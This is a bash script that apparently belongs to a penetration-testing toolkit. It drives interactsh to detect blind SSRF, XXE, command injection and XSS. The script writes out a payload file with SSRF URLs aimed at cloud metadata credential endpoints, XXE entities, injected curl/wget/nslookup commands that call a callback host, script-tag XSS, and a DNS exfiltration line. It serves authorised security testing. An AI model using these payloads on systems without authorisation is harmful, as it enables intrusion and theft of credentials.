#!/usr/bin/env bash
set -euo pipefail

# Out-of-Band (OOB) interaction testing with interactsh
#
# Generates unique callback URLs for testing blind vulnerabilities:
# - Blind SSRF
# - Blind XXE
# - Blind RCE
# - Blind XSS
#
# Usage: ./scripts/scan-oob.sh <org-name> [options]
# Output: scans/<org>/dynamic-results/oob/

show_help() {
    cat << 'EOF'
Usage: ./scripts/scan-oob.sh <org-name> [options]

Generate and monitor OOB (Out-of-Band) interaction payloads.

This script:
1. Starts an interactsh client session
2. Generates unique callback URLs
3. Creates payload files for manual testing
4. Monitors for incoming interactions
5. Saves any callbacks as findings

Options:
  -s, --server <url>      Interactsh server URL (required)
  -d, --duration <sec>    Monitoring duration in seconds (default: 300)
  -t, --token <token>     Auth token for private interactsh server
  -h, --help              Show this help

Examples:
  # Use public interactsh server
  ./scripts/scan-oob.sh acme-corp -s https://interact.sh

  # Use self-hosted server
  ./scripts/scan-oob.sh acme-corp -s https://oob.example.com

  # Extended monitoring
  ./scripts/scan-oob.sh acme-corp -s https://oob.example.com -d 600

Output:
  scans/<org>/dynamic-results/oob/payloads-<timestamp>.txt   - Payloads to inject
  scans/<org>/dynamic-results/oob/interactions-<timestamp>.json - Captured callbacks

Usage Flow:
  1. Run this script to start monitoring
  2. Use the generated payloads in your manual testing
  3. Any callbacks indicate confirmed blind vulnerabilities
  4. Press Ctrl+C to stop monitoring
EOF
    exit 0
}

if [[ $# -lt 1 ]]; then
    show_help
fi

ORG="$1"
shift

# Defaults
INTERACTSH_SERVER=""
DURATION=300
TOKEN=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        -s|--server) INTERACTSH_SERVER="$2"; shift 2 ;;
        -d|--duration) DURATION="$2"; shift 2 ;;
        -t|--token) TOKEN="$2"; shift 2 ;;
        -h|--help) show_help ;;
        *) echo "Unknown option: $1"; show_help ;;
    esac
done

if [[ -z "$INTERACTSH_SERVER" ]]; then
    echo "Error: Interactsh server URL required (-s)"
    echo ""
    echo "Use public server: -s https://interact.sh"
    echo "Or self-hosted:    -s https://oob.yourdomain.com"
    exit 1
fi

RESULTS_DIR="$(pwd)/scans/$ORG/dynamic-results/oob"
mkdir -p "$RESULTS_DIR"

TIMESTAMP=$(date +%Y%m%d-%H%M%S)
OUTPUT_FILE="$RESULTS_DIR/interactions-$TIMESTAMP.json"
PAYLOAD_FILE="$RESULTS_DIR/payloads-$TIMESTAMP.txt"
SESSION_FILE="$RESULTS_DIR/session-$TIMESTAMP.txt"

if ! command -v interactsh-client &> /dev/null; then
    echo "Error: interactsh-client is required but not installed."
    echo "Run: ./scripts/setup-dynamic-tools.sh"
    exit 1
fi

echo "========================================"
echo "OOB Interaction Testing: $ORG"
echo "========================================"
echo "Server: $INTERACTSH_SERVER"
echo "Duration: ${DURATION}s"
echo "Output: $RESULTS_DIR/"
echo "========================================"
echo ""

# Build interactsh-client arguments
CLIENT_ARGS=(
    -server "$INTERACTSH_SERVER"
    -json
    -o "$OUTPUT_FILE"
    -v
)

[[ -n "$TOKEN" ]] && CLIENT_ARGS+=(-token "$TOKEN")

echo "Starting interactsh client..."
echo "Generating unique callback subdomain..."
echo ""

# Start interactsh-client and capture the subdomain
# Run in background, capture output to get the subdomain
TEMP_OUTPUT=$(mktemp)

# Start the client in background
interactsh-client "${CLIENT_ARGS[@]}" > "$TEMP_OUTPUT" 2>&1 &
CLIENT_PID=$!

# Wait a moment for the subdomain to be generated
sleep 3

# Try to extract the subdomain from output
SUBDOMAIN=""
if [[ -f "$TEMP_OUTPUT" ]]; then
    # Look for the subdomain in various output formats
    SUBDOMAIN=$(grep -oE '[a-z0-9]{20,}\.[a-z0-9.-]+' "$TEMP_OUTPUT" 2>/dev/null | head -1 || true)
fi

# If we couldn't get the subdomain, provide instructions for manual approach
if [[ -z "$SUBDOMAIN" ]]; then
    echo "Note: Could not automatically capture subdomain."
    echo "Check the output above for your unique subdomain."
    echo ""
    SUBDOMAIN="<your-subdomain>.$INTERACTSH_SERVER"
fi

# Save session info
cat > "$SESSION_FILE" << EOF
OOB Session: $TIMESTAMP
Server: $INTERACTSH_SERVER
Subdomain: $SUBDOMAIN
PID: $CLIENT_PID
Started: $(date)
EOF

# Generate payload file
cat > "$PAYLOAD_FILE" << EOF
# OOB Interaction Payloads
# Organization: $ORG
# Session: $TIMESTAMP
# Server: $INTERACTSH_SERVER
#
# Replace <SUBDOMAIN> with your actual interactsh subdomain
# shown in the monitoring output above.
#
# Any interaction received = confirmed blind vulnerability!

# ============================================
# SSRF Payloads
# ============================================

# Basic SSRF
http://<SUBDOMAIN>
https://<SUBDOMAIN>
http://<SUBDOMAIN>/ssrf-test
//<SUBDOMAIN>

# SSRF with protocol smuggling
http://<SUBDOMAIN>:80
http://<SUBDOMAIN>:443
http://<SUBDOMAIN>:8080

# SSRF URL encoding
http://%53%55%42%44%4f%4d%41%49%4e

# AWS metadata SSRF chain (if you get SSRF, try these)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ============================================
# Blind XXE Payloads
# ============================================

# Basic XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<SUBDOMAIN>/xxe">]>
<foo>&xxe;</foo>

# Parameter entity XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<SUBDOMAIN>/xxe">%xxe;]>
<foo>test</foo>

# ============================================
# Blind Command Injection Payloads
# ============================================

# curl-based
\$(curl http://<SUBDOMAIN>/rce)
\`curl http://<SUBDOMAIN>/rce\`
| curl http://<SUBDOMAIN>/rce
; curl http://<SUBDOMAIN>/rce
& curl http://<SUBDOMAIN>/rce
&& curl http://<SUBDOMAIN>/rce

# wget-based
\$(wget http://<SUBDOMAIN>/rce)
| wget http://<SUBDOMAIN>/rce
; wget http://<SUBDOMAIN>/rce

# nslookup-based (DNS exfil)
\$(nslookup <SUBDOMAIN>)
| nslookup <SUBDOMAIN>
; nslookup <SUBDOMAIN>

# PowerShell (Windows)
; Invoke-WebRequest http://<SUBDOMAIN>/rce
| Invoke-WebRequest http://<SUBDOMAIN>/rce

# ============================================
# Blind XSS / SSTI Payloads
# ============================================

# Blind XSS (stored)
<script src="http://<SUBDOMAIN>/xss"></script>
<img src="http://<SUBDOMAIN>/xss">
"><script src="http://<SUBDOMAIN>/xss"></script>

# ============================================
# DNS Exfiltration Patterns
# ============================================

# Use for data exfil via subdomain
<data>.<SUBDOMAIN>

# Example: exfil username
\$(whoami).<SUBDOMAIN>

EOF

echo "Payloads generated: $PAYLOAD_FILE"
echo ""
echo "========================================"
echo "Monitoring for interactions"
echo "========================================"
echo ""
echo "Duration: ${DURATION} seconds"
echo "Press Ctrl+C to stop early"
echo ""
echo "Use payloads from: $PAYLOAD_FILE"
echo "Replace <SUBDOMAIN> with your actual subdomain shown above"
echo ""
echo "Waiting for interactions..."
echo ""

# Function to cleanup on exit
cleanup() {
    echo ""
    echo "Stopping interactsh client..."
    kill $CLIENT_PID 2>/dev/null || true
    rm -f "$TEMP_OUTPUT"

    echo ""
    echo "========================================"
    echo "Session Complete"
    echo "========================================"

    if [[ -f "$OUTPUT_FILE" ]] && [[ -s "$OUTPUT_FILE" ]]; then
        INTERACTION_COUNT=$(wc -l < "$OUTPUT_FILE" | xargs)
        echo "Interactions captured: $INTERACTION_COUNT"
        echo ""

        if [[ "$INTERACTION_COUNT" -gt 0 ]]; then
            echo "Interaction types:"
            jq -r '.protocol // "unknown"' "$OUTPUT_FILE" 2>/dev/null | sort | uniq -c | sed 's/^/  /' || true
            echo ""
            echo "*** VULNERABILITIES CONFIRMED ***"
            echo "Each interaction indicates a blind vulnerability!"
        fi

        echo ""
        echo "Results: $OUTPUT_FILE"
    else
        echo "No interactions captured"
    fi

    echo "Payloads: $PAYLOAD_FILE"
    echo "Session: $SESSION_FILE"
    echo ""
}

trap cleanup EXIT

# Wait for the specified duration or until interrupted
tail -f "$TEMP_OUTPUT" 2>/dev/null &
TAIL_PID=$!

sleep "$DURATION" || true

kill $TAIL_PID 2>/dev/null || true
